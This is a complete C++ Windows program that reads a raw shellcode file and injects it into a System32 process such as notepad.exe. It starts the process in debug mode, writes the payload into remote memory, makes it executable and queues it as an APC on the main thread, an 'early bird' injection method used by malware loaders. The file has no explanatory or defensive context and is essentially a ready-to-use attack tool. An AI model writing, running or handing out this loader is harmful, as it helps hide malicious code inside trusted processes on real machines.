#include <Windows.h>
#include <iostream>
#include <fstream>
#include <vector>
#include <iterator>

std::vector<BYTE> ReadPayload(const char* path) {
    std::ifstream file(path, std::ios::binary);
    if (!file) return {};
    return std::vector<BYTE>((std::istreambuf_iterator<char>(file)),
                             std::istreambuf_iterator<char>());
}

int main(int argc, char* argv[]) {
    if (argc < 3) {
        std::cerr << "Usage: <executable>.exe <payload.bin> notepad.exe\n";
        return 1;
    }

    std::vector<BYTE> payload = ReadPayload(argv[1]);
    if (payload.empty()) { std::cerr << "[-] Failed to read payload\n"; return 1; }
    std::cout << "[+] Downloaded " << payload.size() << " bytes\n";

    char WnDr[MAX_PATH] = { 0 };
    char lpPath[MAX_PATH] = { 0 };
    if (!GetEnvironmentVariableA("WINDIR", WnDr, MAX_PATH)) {
        std::cerr << "[-] GetEnvironmentVariableA failed: " << GetLastError() << "\n";
        return 1;
    }
    sprintf_s(lpPath, "%s\\System32\\%s", WnDr, argv[2]);
    std::cout << "[+] Target: " << lpPath << "\n";

    STARTUPINFOA Si = { sizeof(Si) };
    PROCESS_INFORMATION Pi = {};
    if (!CreateProcessA(NULL, lpPath, NULL, NULL, FALSE, DEBUG_PROCESS,
                        NULL, NULL, &Si, &Pi)) {
        std::cerr << "[-] CreateProcessA failed: " << GetLastError() << "\n";
        return 1;
    }
    std::cout << "[+] Created " << argv[2] << " (PID: " << Pi.dwProcessId
              << ") in debug mode\n";

    LPVOID pAddress = VirtualAllocEx(Pi.hProcess, NULL, payload.size(),
                                     MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!pAddress) { std::cerr << "[-] VirtualAllocEx failed\n"; return 1; }
    std::cout << "[+] Allocated remote memory at: " << pAddress << "\n";

    SIZE_T written = 0;
    if (!WriteProcessMemory(Pi.hProcess, pAddress, payload.data(),
                            payload.size(), &written)) {
        std::cerr << "[-] WriteProcessMemory failed\n"; return 1;
    }
    std::cout << "[+] Written " << written << " bytes\n";

    DWORD oldProtect = 0;
    VirtualProtectEx(Pi.hProcess, pAddress, payload.size(),
                     PAGE_EXECUTE_READWRITE, &oldProtect);

    
    if (QueueUserAPC((PAPCFUNC)pAddress, Pi.hThread, NULL) == 0) {
        std::cerr << "[-] QueueUserAPC failed: " << GetLastError() << "\n";
        return 1;
    }
    std::cout << "[+] APC queued to main thread (TID: " << Pi.dwThreadId << ")\n";

    if (!DebugActiveProcessStop(Pi.dwProcessId)) {
        std::cerr << "[-] DebugActiveProcessStop failed\n"; return 1;
    }
    std::cout << "[+] Detached - payload will execute\n";
    std::cout << "[+] Press Enter to quit...\n";
    std::cin.get();

    CloseHandle(Pi.hThread);
    CloseHandle(Pi.hProcess);
    return 0;
}